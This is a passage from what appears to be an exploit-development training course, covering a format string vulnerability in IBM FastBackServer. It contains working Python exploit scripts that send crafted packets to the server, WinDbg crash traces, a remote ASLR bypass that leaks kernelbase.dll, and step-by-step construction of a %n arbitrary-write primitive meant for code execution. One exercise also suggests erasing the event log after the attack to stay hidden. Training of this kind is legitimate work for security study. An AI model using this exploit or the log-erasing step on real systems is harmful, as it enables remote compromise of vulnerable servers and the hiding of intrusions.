buf += b"%x" * 0x6b 
buf += b"B" * 0x100 
buf += b"C" * 0x100 

# Padding
buf += bytearray([0x41]*(0x404-len(buf)))

s.send(buf)
Listing 100 - A %s specifier is inserted in the 20th position
When the updated code is executed, the stack address will be leaked as normal, and then the new packet is processed. This will cause vsnprintf to interpret the four A's, or 0x41414141, as a pointer to a character array.
Since we have not provided a valid address yet, we can expect an access violation when the four A's are being treated as an address.
Listing 101 shows the result of executing the updated code.
(2384.2490): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=00000073 ecx=41414141 edx=7fffffff esi=7ffffffe edi=00000800
eip=00672ead esp=0db7d964 ebp=0db7dbbc iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
FastBackServer!_output+0x49a:
00672ead 803800          cmp     byte ptr [eax],0           ds:0023:41414141=??

0:081> k
 # ChildEBP RetAddr  
00 0db7dbbc 0066bf8e FastBackServer!_output+0x49a
01 0db7dbf4 0065b14b FastBackServer!_vsnprintf+0x2c
02 0db7dc0c 004803ff FastBackServer!ml_vsnprintf+0x18
03 0db7dea4 0048056d FastBackServer!EventLog_wrapted+0x2e2
04 0db7e2d4 0054b6a0 FastBackServer!EventLog+0x13c
05 0db7e31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd
06 0dbdfe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab
07 0dbdfeb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
Listing 101 - vsnprintf tries to process 0x41414141 as a string pointer
From the call stack, we find that an access violation indeed comes from the call to vsnprintf because of the invalid string pointer we provided.
This provides us with confidence that this attack will indeed work.
Next, we will replace the static A's with the leaked stack address, adjusted for the offset. We must also read the leaked pointer to Kernelbase.dll from the event log and parse the data returned to us.
Listing 102 shows the updated code.
...
targetAddr = stackAddr - 0x15c
# psAgentCommand
buf = pack(">i", 0x400)
buf += bytearray([0x41]*0xC)
buf += pack("<i", 0x604)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += b"w00t:BB" + pack("<i", targetAddr) + b"%x:" * 20
buf += b"%s"
buf += b"%x" * 0x6b 
buf += b"B" * 0x100 
buf += b"C" * 0x100 

# Padding
buf += bytearray([0x41]*(0x404-len(buf)))

s.send(buf)

responseSize = s.recv(4)
size = int(responseSize.hex(),16)

aSize = 0
while True:
	tmp = s.recv(size - aSize)
	aSize += len(tmp)
	if aSize == size:
		break	
...
Listing 102 - Using the target stack address with %s
First, we'll modify the code to use the leaked stack address after subtracting the offset for the return value.
Next, we will add code to receive the response from the server. This is not data we need, but we must clear the receive buffer to subsequently read from the event log.
Once both leak packets have been sent, the address into kernelbase.dll will be written to the event log and we can read it out.
There is one issue we have to solve first. When we perform the stack leak and subsequent read, we're relying on the enumerated optimal Start value. When we leak the kernelbase.dll pointer, another "w00t" header is written to the event log.
If we perform a read, we would also read out the previous content and would have to filter out the first leak. The event log may also grow in the time between the two reads.
We can address this issue by adding the amount of data we read from the event log when we found the stack address to the Start value.
This will start the reading operation later in the event log, enabling us to avoid multiple leaked values at once. Using this method also prevents the event log from growing in such a way that our read primitive cannot obtain the new value.
We can implement this solution quite easily by right-shifting the amount of data we have read by 8 and adding that to the Start value. The implementation is shown in Listing 103.
...
print("The size read is: " + str(hex(aSize)))
startValue += (aSize >> 8)	

data = eventData.split(b"w00t:")
values = data[1].split(b":")
...
Listing 103 - Updating the Start value
Note that this occurs right after we have read the data from the event log the first time.
Finally, we need to parse the event log that was returned the second time. We can once again split on the "w00t:" header and subsequently split on the ":" delimiter. This time we must grab the 21st entry, which has the index 20.
The updated code requires another packet to fetch the event log entry, as well as the code shown in Listing 104.
print("The size read is: " + str(hex(aSize)))
	
data = eventData.split(b"w00t:")
values = data[1].split(b":")
kbString = (values[20])[0:4]
kernelbaseAddr = kbString[3] << 24
kernelbaseAddr += kbString[2] << 16
kernelbaseAddr += kbString[1] << 8
kernelbaseAddr += kbString[0] 

print("Leaked Kernelbase address is: " + str(hex(kernelbaseAddr)))
Listing 104 - Parsing the event log for kernelbase.dll address
The 21st entry also happens to be the last included in the formatted string. This means when we perform the split, additional data will be included. Let's avoid this by grabbing only the first four bytes into the kbString variable.
To properly view the kernelbase.dll address, we'll need to switch the endianness, which is implemented by a simple bit shift. Lastly, the located address is printed to the console.
Our final step is to find the offset from the leaked kernelbase pointer to its base address.
0:006> ? KERNELBASE!WaitForSingleObjectEx+0x13a - kernelbase
Evaluate expression: 1098602 = 0010c36a
Listing 105 - Offset from WaitForSingleObjectEx+0x13a to base address
We can now subtract this static offset from the leaked kernelbase address to give us the module base address. When the updated exploit is executed, the leaked kernelbase address is printed.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x61eea
Stack address is written to event log
The eventlog returned contains 3e03 bytes
The size read is: 0x3e03
Leaked stack address is: 0x1215ded4
Kernelbase address leaked to event log
The eventlog returned contains 2303 bytes
The size read is: 0x2303
Leaked Kernelbase address is: 0x745dc36a
Kernelbase base address is: 0x744d0000
Listing 106 - Leaking the base address of kernelbase.dll
Our efforts have paid off! We have remotely obtained the base address of kernelbase.dll, which allows us to completely bypass ASLR. Excellent!
Our work so far has enabled us to read from anywhere inside the process memory space we desire. The result of our work is commonly known as a read primitive.
Exercises
1.	Go through the analysis performed in this section.
2.	Put all the pieces of the exploit together and remotely obtain the base address of kernelbase.dll to bypass ASLR.
Extra Mile
Combine the ASLR bypass with one of the previously-exploited memory corruption vulnerabilities in FastBackServer to build a ROP chain and obtain remote code execution.
Extra Mile
When we use the format string function and the event log to read and write from memory, we generate a large amount of event log entries. In the spirit of stealth, it would be nice to clear the event log once our attack is complete.
Earlier in the module, we found two cross references to the EventLOG_sSFILE global variable. The cross reference we used let us remotely read the event log. The other cross reference leads to a basic block containing a pointer to the string "Event Log Erased".
Perform the required reverse engineering to understand what this code branch does and how to trigger it. Finally, modify the proof of concept to delete contents from the event log after we have bypassed ASLR.
1 (Python, 2020), https://docs.python.org/3/library/functions.html#input
2 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/bp--bu--bm--set-breakpoint-
11.5. Wrapping Up
This module introduced the concept of a read primitive through a format string vulnerability. Through extensive reverse engineering and analysis, we have managed to build an exploit that remotely bypasses ASLR.
A remote ASLR bypass can be combined with a memory corruption vulnerability, like a stack buffer overflow, to bypass Windows mitigations and obtain remote code execution. In the next module, we will return to the format string vulnerability and leverage it to create a write primitive as well. 
12. Format String Specifier Attack Part II
In the previous module, we performed extensive reverse engineering to find a way to leverage a format string vulnerability and develop a read primitive. Our read primitive was able to read memory contents at an arbitrary, null-free address.
We used our read primitive to bypass ASLR, which can be used in combination with a memory corruption vulnerability to create an exploit bypassing both ASLR and DEP.
In this module, we will explore ways to use the same format string vulnerability to gain code execution without needing an additional vulnerability.
12.1. Write Primitive with Format Strings
As with most complicated exploits, we need to go through several steps, so we'll divide up the required work. We have already leaked the base address of kernelbase.dll through a read primitive. Next, let's determine whether we might be able to create a write primitive, which we can use to modify content in memory.
Many advanced exploits leverage both read and write primitives to bypass mitigations and obtain code execution. In the next few sections, we'll create a write primitive, which we'll use later in the module to overwrite EIP and achieve code execution.
Depending on the application, there are various ways to create a read or write primitive. In our case, we'll start by revisiting some aspects of format specifier theory.
12.1.1. Format String Specifiers Revisited
We've been working with both hexadecimal and string format specifiers so far. In the module regarding Format String Specifier Attacks, we briefly explored other specifiers, such as decimal and floating point.
These specifiers only let us read data or memory, but there's a unique specifier for us to focus on called %n.
Rather than formatting or helping to print text, this specifier writes the number of characters processed into a supplied address.1 Listing 1 shows an example of how the %n specifier can be used with printf.
printf("This is a string %n", 0x41414141);
Listing 1 - Example use of %n in printf
When this code is executed, the hardcoded string is printed to the console and its length (0x11) is written to the address 0x41414141. If the provided address is not valid, an access violation is raised.
Note that the length written does not include the format string specifier, but only the characters preceding it.
Since this format specifier writes to memory, it poses a potential security risk, so compilers like Visual Studio have disabled it by default.2
However, if a less secure compiler is used or %n has been enabled, we can attempt to leverage it to create a write primitive.
Let's find out if this is possible with FastBackServer. We can reuse our previous code to send a string format specifier, replacing it with %n.
A standalone script for this check is given in Listing 2.
import socket
import sys
from struct import pack

def main():
	if len(sys.argv) != 2:
		print("Usage: %s <ip_address>\n" % (sys.argv[0]))
		sys.exit(1)
	
	server = sys.argv[1]
	port = 11460
	
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((server, port))

	# psAgentCommand
	buf = pack(">i", 0x400)
	buf += bytearray([0x41]*0xC)
	buf += pack("<i", 0x604)  # opcode
	buf += pack("<i", 0x0)    # 1st memcpy: offset
	buf += pack("<i", 0x100)  # 1st memcpy: size field
	buf += pack("<i", 0x100)  # 2nd memcpy: offset
	buf += pack("<i", 0x100)  # 2nd memcpy: size field
	buf += pack("<i", 0x200)  # 3rd memcpy: offset
	buf += pack("<i", 0x100)  # 3rd memcpy: size field
	buf += bytearray([0x41]*0x8)

	# psCommandBuffer
	buf += b"w00t:BBAAAA" + b"%x:" * 20
	buf += b"%n"
	buf += b"%x" * 0x6b 
	buf += b"B" * 0x100 
	buf += b"C" * 0x100 

	# Padding
	buf += bytearray([0x41]*(0x404-len(buf)))

	s.send(buf)
	s.close()
	sys.exit(0)

if __name__ == "__main__":
 	main()
Listing 2 - Script to trigger a write to 0x41414141
The address we've attempted to write to is 0x41414141, and thus invalid. If the %n specifier is enabled, we would expect an access violation when it is invoked.
Listing 3 shows the result in WinDbg when the packet is sent:
(1d34.1354): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=0000006e ecx=000000c7 edx=00000200 esi=102edf4a edi=00000800
eip=00672f1a esp=102ed964 ebp=102edbbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
FastBackServer!_output+0x507:
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
Listing 3 - Access violation due to %n specifier
We do indeed get an access violation, which means the %n specifier is enabled.
We'll observe that the access violation occurs because we attempt to write the contents of ECX to 0x41414141. This proves that if we replace 0x41414141 with a valid address, we can make the application write a value to it.
This is a very important finding that we will leverage for code execution. We can already arbitrarily control the location being written to, but we must also control the value being written. We'll explore this topic in the next section.
Exercise
1.	Ensure you understand how the %n format specifier works and obtain an access violation by writing to an invalid memory address.
1 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/printf/
2 (Microsoft, 2016), https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/set-printf-count-output?redirectedfrom=MSDN&view=msvc-160
12.1.2. Overcoming Limitations
The main goal in this section is to create a write primitive that can overwrite the contents at an arbitrary memory address with content of our choosing.
During this process, we'll encounter a number of limitations and restrictions on how the %n specifier allows us to write to memory. We will be required to think creatively to address each challenge, using the type of thought process needed for other advanced attacks, such as those used in browser exploits.
Let's use our knowledge from the reverse engineering we performed in the previous module to understand the value being written. We'll start by examining the access violation triggered in the previous section, which is repeated in Listing 4.
(1d34.1354): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=0000006e ecx=000000c7 edx=00000200 esi=102edf4a edi=00000800
eip=00672f1a esp=102ed964 ebp=102edbbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
FastBackServer!_output+0x507:
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
Listing 4 - Access violation due to %n specifier
The %n specifier triggers a write of the number of bytes written so far. This value is 0xC7, as shown in the listing above.
To understand the size being written we must take a look at the format string. We can start by revisiting the call to vnsprintf that triggers the vulnerability in IDA Pro:
 
Figure 1: Call to vsnprintf
Figure 1 shows that the format string is the third argument and will thus be located at an offset of 0xC bytes from the return address on the stack.
Now we can dump the call stack and locate the return address as shown in Listing 5.
0:079> k
 # ChildEBP RetAddr  
00 102edbbc 0066bf8e FastBackServer!_output+0x507
01 102edbf4 0065b14b FastBackServer!_vsnprintf+0x2c
02 102edc0c 004803ff FastBackServer!ml_vsnprintf+0x18
03 102edea4 0048056d FastBackServer!EventLog_wrapted+0x2e2
04 102ee2d4 0054b6a0 FastBackServer!EventLog+0x13c
05 102ee31c 0056df61 FastBackServer!AGI_S_GetAgentSignature+0xdd
06 1034fe98 0056a21f FastBackServer!FXCLI_OraBR_Exec_Command+0x1aab
07 1034feb4 00581366 FastBackServer!FXCLI_C_ReceiveCommand+0x130
08 1034fef0 0048ca98 FastBackServer!FX_AGENT_Cyclic+0x116
09 1034ff48 006693e9 FastBackServer!ORABR_Thread+0xef
0a 1034ff80 75b99564 FastBackServer!_beginthreadex+0xf4
0b 1034ff94 7798293c KERNEL32!BaseThreadInitThunk+0x24
0c 1034ffdc 77982910 ntdll!__RtlUserThreadStart+0x2b
0d 1034ffec 00000000 ntdll!_RtlUserThreadStart+0x1b

0:079> dds 102edc0c L7
102edc0c  102edea4
102edc10  004803ff FastBackServer!EventLog_wrapted+0x2e2
102edc14  102edca5
102edc18  000001c7
102edc1c  102eded4
102edc20  102edeb8
102edc24  102edc37
Listing 5 - Callstack and return address for vsnprintf
From the callstack we find the return address from vsnprintf must be FastBackServer!EventLog_wrapted+0x2e2, which means we can dump the stack contents of the stack frame from the subsequent call to get the arguments.
At offset 0xC from the return address, we find the memory location for the format string. We can dump that next:
0:079> da 102eded4
102eded4  "AGI_S_GetAgentSignature: couldn'"
102edef4  "t find agent w00t:BBAAAA%x:%x:%x"
102edf14  ":%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%"
102edf34  "x:%x:%x:%x:%x:%x:%x:%n%x%x%x%x%x"
102edf54  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
102edf74  "%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x"
102edf94  "%x%x.."
Listing 6 - Format string used with vnsprintf
When the format string shown in Listing 6 is used with vsnprintf, the static string "AGI_S_GetAgentSignature: couldn't find agent " is first processed. This is followed by our tag "w00t", the alignment bytes, and a number of %x specifiers.
Because the first part is a static string, we have no way of shortening that. Additionally we must keep the %n format specifier as the 21st specifier in order to keep it aligned with the placeholder address given by "AAAA".
As a result, the smallest possible value we can obtain in ECX is 0xC7.
Let's revisit the prototype for a format specifier to learn more about how this value can be increased.1
%[flags][width][.precision][length]specifier
Listing 7 - Format specifier prototype
The subspecifier called [width] determines how many characters are written when a value is formatted. Essentially, this offers a way to pad the formatted result with empty spaces to make it appear more visually appealing.
We can test this by modifying our script to split the 20th %x specifier from the rest. Let's add the arbitrary decimal value 256 as the width.
...
# psCommandBuffer
buf += b"w00t:BBAAAA" + b"%x:" * 19
buf += b"%256x:"
buf += b"%n"
buf += b"%x" * 0x6b 
buf += b"B" * 0x100 
buf += b"C" * 0x100
...
Listing 8 - Added a 256 width to the 20th %x specifier
We'll restart FastBackServer, attach WinDbg, and execute the modified code. This gives us the access violation shown in Listing 9.
(274c.1b60): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=0000006e ecx=000001bf edx=00000200 esi=0d66df4d edi=00000800
eip=00672f1a esp=0d66d964 ebp=0d66dbbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
FastBackServer!_output+0x507:
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
Listing 9 - Access violation with specifier width
Here, we'll find that the value in ECX has been increased as expected, thus proving we can influence the value that is written.
Note that ECX has been increased by 0xF8, not 0x100, because the original %x format specifier was an 8-character long DWORD.
Ideally, we could write an arbitrary DWORD, but we have already found that we cannot write below the value 0xC7. We'll also recall the function prototype of vsnprintf2, repeated in Listing 10.
int vsnprintf(
  char *s,
  size_t n,
  const char *format,
  va_list arg
);
Listing 10 - Function prototype for vsnprintf
The second argument is the maximum size of the formatted string, which means arbitrarily increasing the width of the %x specifier will likely cause it to be truncated.
Let's determine the maximum allowed value by revisiting the code segment that invokes the vsnprintf call inside EventLog_wrapted, as shown in Figure 2.
 
Figure 2: Maximum size written to event log
We'll notice a hardcoded upper limit of 0x1F4 bytes is present, but a dynamic value is subtracted from this. We can determine this value if we restart FastBackServer, set a breakpoint at FastBackServer!AGI_S_GetAgentSignature+0xd8 and trigger it with the same proof of concept.
Next, we set a breakpoint on FastBackServer!EventLog_wrapted+0x2c9, which is only triggered in the same thread context through the "~." prefix. This allows us to reach the desired instruction in the correct thread context:
0:001> bp FastBackServer!AGI_S_GetAgentSignature+0xd8

0:001> g
...

0:001> ~. bp FastBackServer!EventLog_wrapted+0x2c9

0:001> g
...
eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=7efeff08 esi=0607c4e0 edi=00669360
eip=004803e6 esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog_wrapted+0x2c9:
004803e6 baf4010000      mov     edx,1F4h

0:001> p
eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=000001f4 esi=0607c4e0 edi=00669360
eip=004803eb esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206
FastBackServer!EventLog_wrapted+0x2ce:
004803eb 2b55c8          sub     edx,dword ptr [ebp-38h] ss:0023:0d52de6c=0000002d

0:001> p
eax=0d52deb8 ebx=0607c4e0 ecx=0d52ded4 edx=000001c7 esi=0607c4e0 edi=00669360
eip=004803ee esp=0d52dc1c ebp=0d52dea4 iopl=0         nv up ei pl nz ac po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000212
FastBackServer!EventLog_wrapted+0x2d1:
004803ee 52              push    edx
Listing 11 - Maximum size of the formatted string
In the calculation shown in Listing 11, the dynamic value 0x2D is subtracted from the static value 0x1F4, which results in a maximum size of the formatted string of 0x1C7 characters. 0x1C7 bytes is far from our goal of being able to write an arbitrary DWORD, so we'll need to find a creative solution.
Let's summarize our findings so far. We're able to write a value between 0xC7 and 0x1C7 at an arbitrary null free address at this point.
Although we cannot directly write an arbitrary DWORD value, we can trigger the vulnerability multiple times. This will allow us to combine four overwrites of one byte at increasing memory addresses to obtain a full DWORD.
Before we go for a full DWORD, let's learn more about how we can write an arbitrary byte in memory. By invoking the vulnerability, we can easily write the values between 0xC7 and 0xFF. If we write the value 0x100 and only examine the byte at the address we targeted, this is effectively 0x00 since the leading value of 1 goes into the next byte.
In this way, we can write the values from 0x100 to 0x1C6 to obtain an arbitrary byte value between 0x00 and 0xC6 in the targeted address, while ignoring the higher bytes.
Let's now expand on this, triggering the vulnerability four times to write four arbitrary bytes next to each other. Listing 12 shows this concept by writing the DWORD 0x1234ABCD into the address 0x41414141.
Write Address     Value     Result

Initial state               00 00 00 00
                            -----------
0x41414141        0xCD      00 00 00 CD
                            -----------
0x41414142        0x1AB     00 01 AB CD
                            -----------
0x41414143        0x134     01 34 AB CD
                            -----------
0x41414144        0x112     12 34 AB CD
Listing 12 - Write a byte 4 times gives a DWORD
As illustrated in the listing above, we first write the value 0xCD to the address 0x41414141, then we write the value 0x1AB to the address 0x41414142. This leaves the previous value we wrote intact and the two lower bytes now contain 0xABCD, as desired.
Following this process, we can write arbitrary content into all four bytes and obtain the DWORD 0x1234ABCD in memory. The instruction used to write to memory is "mov dword ptr [eax],ecx", which means a full DWORD is written. This has the side effect of also overwriting the three bytes above the desired address.
In theory, we can follow this concept to develop a working write primitive. We'll need to solve a number of implementation challenges, however. These challenges include:
1.	Determining width values for the %x specifier to write values between 0xC7 and 0x1C7.
2.	Automatically calculating the width value in the script.
3.	Combining the stack leak and ability to write a byte.
4.	Combining four writes of a single byte into a DWORD.
Let's tackle these one at a time to build out the required code.
We previously found that providing no width subspecifier results in the value 0xC7 being written, but if the width value is less than the maximum size vsnprintf processes, the output is not truncated.
This means we need to determine the smallest width value that still results in 0xC7 being written. The value processed by the 20th %x format specifier is a DWORD read from the stack, which is interpreted as a hexadecimal value. This means it can only be between zero and eight characters long when written.
To build a stable exploit, we'll need to ensure that the size contained in the DWORD is fixed. Thinking back to when we developed the code required to leak a pointer from kernelbase.dll, we printed the formatted bytes as found in the event log. Our result is repeated in Listing 13.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x61fe7
Stack address leaked to event log
The eventlog returned contains 1103 bytes
The size read is: 0x1103
[b'BBAAAAc4', b'1029ded4', b'3a', b'25', b'12e', b'78', b'0', b'5f494741', b'65475f53', b'65674174', b'6953746e', b'74616e67', b'3a657275', b'756f6320', b'276e646c', b'69662074', b'6120646e', b'746e6567', b'30307720', b'42423a74', b'41414141', b'2\n[May 14 10', b'58', b'05', b'032](1b60)->I4.FX_AGENT \t' 
...
Leaked stack address is: 0x1029ded4
Listing 13 - Output from appending A's
As highlighted in Listing 13, the value that was processed by the 20th %x format specifier is "b'42423a74", which in ASCII translates to "t:BB". These four characters are a substring of "w00t:BB" and is directly under our control.
This means that the DWORD will always contain four characters, or when translated to hexidecimal, eight digits. Because of this, we can start the width value at eight every time without issues.
Let's use this information to write a byte value between 0xC7 and 0xFF, following the algorithm given in Listing 14.
byteValue = <byte value>
if byteValue > 0xC6:
  width = byteValue - 0xC7 + 0x8
Listing 14 - Algorithm to calculate width value
For values between 0x00 and 0xC6, we'll have to be a bit more clever. To write the byte value 0x00, we need the total bytes written to be 0x100.
If we follow the algorithm in Listing 14 for a byteValue of 0xFF, the corresponding width is 0x40. This means that a width of 0x41 would only come from a byteValue of 0x100, which is equivalent to 0x00 in our case.
Let's set up a formula to solve this, as shown in Listing 15, where y is the static addition or subtraction we want to find.
width = byteValue + 0x8 + y
...
0x41 = 0x0 + 0x8 + y <=> y = 0x39
Listing 15 - Formula to calculate static offset
Using the example values we found for a byteValue of 0x00 and related width of 0x41, we'll find y to be 0x39.
Now we can create the remaining portion of the algorithm, as shown in Listing 16.
byteValue = <byte value>
if byteValue > 0xC6:
  width = byteValue - 0xC7 + 0x8
else:
  width = byteValue + 0x39 + 0x8
Listing 16 - Algorithm to calculate width value in all cases
Next, we can implement the completed algorithm in our Python script and use the dynamically-calculated width value with the %x format specifier.
The relevant updated code for attempting to write the value 0xD8 is shown in Listing 17.
...
byteValue = 0xD8

if byteValue > 0xC6:
  width = byteValue - 0xC7 + 0x8
else:
  width = byteValue + 0x39 + 0x8

# psAgentCommand
buf = pack(">i", 0x400)
buf += bytearray([0x41]*0xC)
buf += pack("<i", 0x604)  # opcode
buf += pack("<i", 0x0)    # 1st memcpy: offset
buf += pack("<i", 0x100)  # 1st memcpy: size field
buf += pack("<i", 0x100)  # 2nd memcpy: offset
buf += pack("<i", 0x100)  # 2nd memcpy: size field
buf += pack("<i", 0x200)  # 3rd memcpy: offset
buf += pack("<i", 0x100)  # 3rd memcpy: size field
buf += bytearray([0x41]*0x8)

# psCommandBuffer
buf += b"w00t:BBAAAA" + b"%x:" * 19
buf += b"%" + b"%d" % width + b"x:"
buf += b"%n"
buf += b"%x" * 0x6b 
buf += b"B" * 0x100 
buf += b"C" * 0x100
...
Listing 17 - Updated code to write an arbitrary byte value in memory
Let's execute our updated proof of concept and send the packet to FastBackServer with WinDbg attached.
We can now observe the access violation while writing to 0x41414141:
(2310.b10): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=41414141 ebx=0000006e ecx=000000d8 edx=00000200 esi=0d78df4c edi=00000800
eip=00672f1a esp=0d78d964 ebp=0d78dbbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
FastBackServer!_output+0x507:
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????
Listing 18 - Access violation while writing 0xD8
As highlighted in Listing 18, the correct value (0xD8) is indeed used in the write operation, so our idea works and we are able to write an arbitrary byte value to an arbitrary memory address. Nice!
In this section, we explored the limits imposed upon us by the %n specifier for this particular vsnprintf call. We learned how to write arbitrary byte values despite these limitations. We'll combine this write primitive with our previous stack leak code to write to the stack in the next section.
Exercises
1.	Follow the analysis and ensure you understand the algorithm to calculate the width for an arbitrary byte value.
2.	Update the Python script to perform writes with a byte value through the dynamically-generated width value. Test it with values both above and below 0xC7.
1 (Microsoft, 2019), https://docs.microsoft.com/en-us/cpp/c-runtime-library/format-specification-syntax-printf-and-wprintf-functions?view=msvc-160
2 (cplusplus, 2020), http://www.cplusplus.com/reference/cstdio/vsnprintf/
12.1.3. Write to the Stack
In the previous section, we crossed our first two hurdles by developing an algorithm for the width calculation and implementing it in the Python script to allow the write of an arbitrary byte value.
Our next challenge is to combine the ability to write a byte with our ASLR bypass developed in the previous module, enabling us to write a byte to the stack.
At first glance, this seems fairly simple, since we can insert the write primitive code directly into our ASLR-leak Python script after the base address of kernelbase.dll is printed to the console.
Let's test our idea by making two changes to the code, both highlighted in Listing 19. First, we'll remove the static A's and replace them with the leaked stack address, plus an offset of 0x1000.
We know that the contents of the stack are changed every time a function call is made. This means if we write directly to the leaked stack address, the value might be overwritten before we can verify it in the debugger. This is why we've chosen a large arbitrary offset of 0x1000.
# psCommandBuffer
buf += b"w00t:BB" + pack("<i", stackAddr + 0x1000) + b"%x:" * 19
buf += b"%" + b"%d" % width + b"x:"
buf += b"%n"
buf += b"%x" * 0x6b 
buf += b"B" * 0x100 
buf += b"C" * 0x100 

# Padding
buf += bytearray([0x41]*(0x404-len(buf)))

s.send(buf)
print("Written " + str(hex(byteValue)) + " to address " + str(hex(stackAddr + 0x1000)))
input()

s.close()
sys.exit(0)
Listing 20 - Code to write to the stack address
At the end of the script, we'll call input to pause execution, allowing us to break in WinDbg and examine the contents of the stack address.
In our example, we will write the byte value 0xD8 as before, and have the address to which it is written printed to the console.
kali@kali:~$ python3 poc.py 192.168.120.10
The optimal start value is: 0x60dac
Stack address leaked to event log
The eventlog returned contains b03 bytes
The size read is: 0xb03
Leaked stack address is: 0xd51ded4
Kernelbase address leaked to event log
The eventlog returned contains 503 bytes
The size read is: 0x503
Leaked Kernelbase address is: 0x745dc36a
Kernelbase base address is: 0x744d0000
Written 0xd8 to address 0xd51eed4
Listing 21 - Executing the write primitive
Once the byte is written to the stack address, execution pauses, and we can switch to WinDbg and break into it. Let's examine the contents we wrote.
0:063> dd 0xd51eed4 L1
0d51eed4  000000dc

0:063> ? dc - d8
Evaluate expression: 4 = 00000004
Listing 22 - Examining the stack reveals the wrong value
As shown in Listing 22, the wrong byte value was written. It is off by four bytes.
From the previous section, we know that the write primitive works and our algorithm is correct, so we need to determine why the byte value is off.
As is often the case with exploit development, combining or changing code within an exploit can have unexpected consequences.
To investigate this scenario, we'll execute our previous proof of concept containing only the write primitive, and then examine the contents of the stack.
(2310.b10): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.

0:063> bp FastBackServer!_output+0x507
eax=41414141 ebx=0000006e ecx=000000d8 edx=00000200 esi=0d46df4c edi=00000800
eip=00672f1a esp=0d46d964 ebp=0d46dbbc iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
FastBackServer!_output+0x507:
00672f1a 8908            mov     dword ptr [eax],ecx  ds:0023:41414141=????????

0:001> k
 # ChildEBP RetAddr  
00 0d46dbbc 0066bf8e FastBackServer!_output+0x507
01 0d46dbf4 0065b14b FastBackServer!_vsnprintf+0x2c
02 0d46dc0c 004803ff FastBackServer!ml_vsnprintf+0x18
03 0d46dea4 0048056d FastBackServer!EventLog_wrapted+0x2e2
...
Listing 23 - Callstack during vsnprintf
Now we can dump the contents at the stored return address, which enables us to locate the call from ml_vsnprintf and the supplied arguments. We'll recall that the fourth argument is the address of the array containing the contents used with the format specifiers.
:001> dds 0d46dbbc
0d46dbbc  0d46dbf4
0d46dbc0  0066bf8e FastBackServer!_vsnprintf+0x2c
...
0d46dbf8  0065b14b FastBackServer!ml_vsnprintf+0x18
0d46dbfc  0d46dca5
0d46dc00  000001c7
0d46dc04  0d46ded4
0d46dc08  0d46deb8
0d46dc0c  0d46dea4
...
Listing 24 - Fourth argument for vsnprintf
The array of arguments used with the format specifiers is given in Listing 25. We should keep in mind that we don't control the first seven values.
0:001> dc 0d46deb8
0d46deb8  000000c4 0d46ded4 00000025 00000078  ......F.%...x...
0d46dec8  0000012e 00000025 00000000 5f494741  ....%.......AGI_
0d46ded8  65475f53 65674174 6953746e 74616e67  S_GetAgentSignat
0d46dee8  3a657275 756f6320 276e646c 69662074  ure: couldn't fi
0d46def8  6120646e 746e6567 30307720 42423a74  nd agent w00t:BB
0d46df08  41414141 253a7825 78253a78 3a78253a  AAAA%x:%x:%x:%x:
0d46df18  253a7825 78253a78 3a78253a 253a7825  %x:%x:%x:%x:%x:%
0d46df28  78253a78 3a78253a 253a7825 78253a78  x:%x:%x:%x:%x:%x
Listing 25 - Contents of argument array during standalone
The discrepancy in size must be due to the number of values written to the target address before the %n specifier is reached.
Keeping in mind that the %n specifier only counts the number of values, we know that our algorithm will be off if the number of digits in any of the first seven values, which we do not control, changes.
